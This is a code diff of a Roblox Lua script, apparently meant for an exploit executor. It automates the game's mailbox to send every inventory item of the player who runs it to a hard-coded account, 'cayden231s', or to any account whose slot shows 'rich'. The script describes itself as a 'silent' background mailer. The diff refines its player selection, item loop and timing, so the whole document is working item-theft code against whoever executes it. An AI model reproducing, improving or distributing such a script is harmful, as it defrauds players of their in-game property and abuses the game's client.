@@ -3,7 +3,7 @@ local targetUser = "cayden231s"
 local player = game.Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 
--- Direct Core Layout Paths
+-- Layout Paths from Dex
 local mailboxUI = playerGui:WaitForChild("MailboxUI")
 local frame = mailboxUI:WaitForChild("Frame")
 local sendingFrame = frame:WaitForChild("SendingFrame")
@@ -15,11 +15,10 @@ local sendButton = itemSendFrame:WaitForChild("SendButton")
 local function runTrueBackgroundAutomation()
     print("--- Initializing Silent Background Mailer ---")
     
-    -- STEP 1: Targeted Player Selection via Deep-Scan
+    -- STEP 1: Find and select the player slot card
     local targetButton = nil
     for _, child in ipairs(playerList:GetChildren()) do
-        if child:IsA("GuiObject") then
-            -- Deep scan every text object inside the player slot asset for the username
+        if child.Name == "SendTemplate" or child:IsA("GuiObject") then
             local elements = child:GetDescendants()
             for _, el in ipairs(elements) do
                 if el:IsA("TextLabel") and (string.find(el.Text:lower(), targetUser:lower()) or string.find(el.Text:lower(), "rich")) then
@@ -36,47 +35,50 @@ local function runTrueBackgroundAutomation()
         return
     end
     
-    -- Programmatically trigger the player selection frame flip
-    print("Target player slot locked. Firing selection frame...")
+    print("Target player slot locked. Opening item window...")
     local playerToggle = targetButton:IsA("TextButton") and targetButton or targetButton:FindFirstChildOfClass("TextButton", true)
     if playerToggle then
         firesignal(playerToggle.MouseButton1Click)
         firesignal(playerToggle.Activated)
-        task.wait(0.6) -- Wait for the UI layout view to flip over smoothly
+        
+        -- CRITICAL: Give the game UI half a second to animate and populate items
+        task.wait(0.6) 
     end
     
-    -- STEP 2: Strict Inventory Grid Scanning
-    local scrollBox = itemSendFrame:FindFirstChild("ScrollingFrames") or itemSendFrame:FindFirstChildOfClass("ScrollingFrame", true) or itemSendFrame:FindFirstChild("ScrollingFrame", true)
-    
+    -- STEP 2: Locate the Scrolling Container containing item slots
+    local scrollBox = itemSendFrame:FindFirstChild("ScrollingFrames") or itemSendFrame:FindFirstChildOfClass("ScrollingFrame", true)
     if not scrollBox then
         warn("Inventory item box container could not be found.")
         return
     end
     
-    print("Scanning item grid cells silently...")
-    -- Loop through the absolute items container list
-    for _, cell in ipairs(scrollBox:GetChildren()) do
-        -- Strictly process grid objects, ignoring structural layouts and padding rules
-        if cell:IsA("GuiObject") and cell.Name ~= "UIGridLayout" and cell.Name ~= "UIPadding" and cell.Name ~= "Frame" then
+    -- Check if items actually exist on the screen yet
+    local items = scrollBox:GetChildren()
+    print("Scanning item grid cells silently... Found elements: " .. tostring(#items))
+    
+    -- STEP 3: Safe background item loop
+    for _, cell in ipairs(items) do
+        -- Ignore administrative layout components
+        if cell:IsA("GuiObject") and cell.Name ~= "UIGridLayout" and cell.Name ~= "UIPadding" then
             
-            -- Isolate the direct selection button template inside the inventory square cell
+            -- Only click valid item squares, avoid clicking container frames
             local cellTrigger = cell:IsA("TextButton") and cell or cell:FindFirstChildOfClass("TextButton", true) or cell:FindFirstChildOfClass("ImageButton", true)
             
             if cellTrigger then
-                print("Moving item slot to staging area: " .. cell.Name)
+                print("Staging item slot: " .. cell.Name)
                 firesignal(cellTrigger.MouseButton1Click)
                 firesignal(cellTrigger.Activated)
-                task.wait(0.2) -- Micro-delay to let the frame staging register
+                task.wait(0.2) -- Micro-pause to load item into send slot
                 
-                -- STEP 3: Silent Confirmation Action Firing
+                -- Fire send confirmation
                 if sendButton then
                     firesignal(sendButton.MouseButton1Click)
                     firesignal(sendButton.Activated)
                     
-                    -- Safe cooldown period for the server network handler to process and clear the slot
+                    -- Wait for server network sync before selecting the next item
                     task.wait(1.0)
                 else
-                    warn("Send confirmation button reference was broken during iteration.")
+                    warn("Send confirmation button path missing.")
                     break
                 end
             end
